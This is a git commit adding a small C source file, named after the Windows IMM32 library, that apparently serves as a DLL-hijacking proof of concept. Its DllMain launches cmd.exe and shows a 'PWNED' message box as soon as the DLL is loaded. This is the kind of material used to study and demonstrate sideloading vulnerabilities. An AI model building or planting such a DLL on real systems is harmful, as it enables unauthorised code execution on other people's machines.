2ab57124f669f65909021b4f05bed0f10f05bc46
ricnar456 <ricardonarvaja@gmail.com>
2024-09-29 18:55:28 -0300

    Add files via upload

---
+++ SOURCES/dllmain IMM32.c
@@ -0,0 +1,22 @@
+#include "pch.h"
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        WinExec("cmd.exe", SW_SHOW);
+		MessageBoxA(NULL, "PWNED", "PWNED", MB_OK);
+		break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+
